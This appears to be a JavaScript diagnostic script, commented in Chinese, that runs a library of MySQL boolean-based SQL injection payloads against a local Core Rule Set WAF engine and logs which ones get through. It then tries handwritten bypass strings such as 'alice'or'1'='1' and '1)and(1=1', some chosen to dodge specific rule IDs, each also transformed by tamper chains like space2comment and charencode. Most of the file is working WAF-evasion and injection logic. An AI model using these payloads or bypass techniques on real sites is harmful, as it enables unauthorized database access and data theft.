// 诊断：布尔/报错 payload 在严格 CRS 下的逐条通过性分析
import { evaluate } from './crs-engine.js';
import { pathToFileURL } from 'node:url';
import { resolve } from 'node:path';

const ROOT = resolve(import.meta.dirname, '../..');
const { applyTampers } = await import(pathToFileURL(resolve(ROOT, 'server/src/core/tamper/applyTampers.js')).href);
const { PAYLOADS } = await import(pathToFileURL(resolve(ROOT, 'server/src/engine/payloads/index.js')).href);

// 各场景的原始值与注入后缀（模拟真实闭合需求）
const SCEN = {
  num: { orig: '1' },
  str: { orig: 'alice', boundary: "'" },
  like: { orig: 'keyboard', boundary: "%'" },
  orderby: { orig: 'id' },
};

function fill(tpl, orig) {
  return tpl.replace(/\{ORIG\}/g, orig).replace(/\{NUM\}/g, '2').replace(/\{SLEEP\}/g, '5').replace(/\{SEP\}/g, '-- -');
}

function testPayload(p, param = 'id') {
  return evaluate({ uri: `/${param}?${param}=1`, queryString: `${param}=1`, args: { [param]: p }, cookies: {}, headers: {} });
}

// MySQL 布尔池固定索引：[0,2]/[1,3] 真假对，[4,5]，[6,7]
const boolPool = PAYLOADS.MySQL.boolean || [];
console.log(`MySQL boolean 池规模：${boolPool.length}`);

for (const [scn, { orig, boundary }] of Object.entries(SCEN)) {
  const val = boundary ? orig + boundary : orig;
  console.log(`\n=== 场景 ${scn}（orig=${val}）===`);
  const results = [];
  for (let i = 0; i < boolPool.length; i++) {
    const p = fill(boolPool[i], val);
    const r = testPayload(p, scn === 'like' ? 'q' : scn === 'orderby' ? 'sort' : scn === 'str' ? 'name' : 'id');
    results.push({ i, p, blocked: r.blocked, rule: r.ruleId, msg: (r.msg || '').slice(0, 60) });
  }
  const passed = results.filter((x) => !x.blocked);
  console.log(`通过 ${passed.length}/${results.length}`);
  for (const x of passed) console.log(`  过  [${x.i}] ${x.p.slice(0, 90)}`);
  // 拦截规则分布
  const dist = {};
  for (const x of results.filter((x) => x.blocked)) dist[x.rule] = (dist[x.rule] || 0) + 1;
  console.log(`拦截规则分布：${JSON.stringify(dist)}`);
}

// 再测：候选绕过向量手工验证（防降级 + tamper 组合）
console.log('\n=== 候选绕过向量手工验证 ===');
const CANDIDATES = [
  // 注释用 # 避开 942460（-- - 是4连非词字符）
  "alice' AND 1=1#",
  "alice'='alice",
  "alice' AND '1'='1",
  "keyboard%' AND 1=1#",
  "id,1=1",
  "id`(select 1)",
  // 纯词法最小化布尔
  "alice'or'1'='1",
  "1 and 1=1",
  "1)and(1=1",
  "alice'and'1'='1",
  "1'='1",
];
for (const p of CANDIDATES) {
  const r = testPayload(p);
  console.log(`  ${r.blocked ? `拦(${r.ruleId})` : '过'}  ${p}`);
  // tampers 后
  for (const chain of [['space2comment'], ['charencode'], ['space2plus']]) {
    const t = applyTampers(p, { dbms: 'MySQL', config: {} }, chain);
    const r2 = testPayload(t);
    console.log(`    ${chain.join('+')}: ${r2.blocked ? `拦(${r2.ruleId})` : '过'}  ${t.slice(0, 70)}`);
  }
}
